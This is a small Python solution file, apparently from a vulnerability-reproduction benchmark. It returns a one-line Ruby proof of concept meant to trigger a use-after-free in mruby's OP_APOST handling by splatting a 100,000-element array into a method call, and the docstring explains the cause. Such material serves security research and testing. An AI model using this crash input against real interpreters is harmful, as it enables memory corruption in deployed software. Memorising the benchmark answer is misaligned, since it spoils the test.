import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to CVE-2018-10199 (or similar issues in mruby) where
        OP_APOST causes a stack extension but fails to update the cached register pointer (regs),
        leading to a Use-After-Free.
        
        To trigger this:
        1. Define a method with pre-arguments, a splat argument (rest), and post-arguments.
           This forces the VM to use the OP_APOST instruction.
        2. Call this method with a large number of arguments to force the VM stack to grow 
           (mrb_stack_extend) during the function call setup or execution.
        """
        # A compact Ruby script that triggers the issue.
        # We create an array of 100,000 elements and splat it into the function call.
        # This places 100,000+ items on the stack, forcing reallocation.
        # When OP_APOST runs, it may access the old stack memory if regs wasn't updated.
        poc = b"def f(a,*b,c);end;f(0,*Array.new(100000,0),0)"
        return poc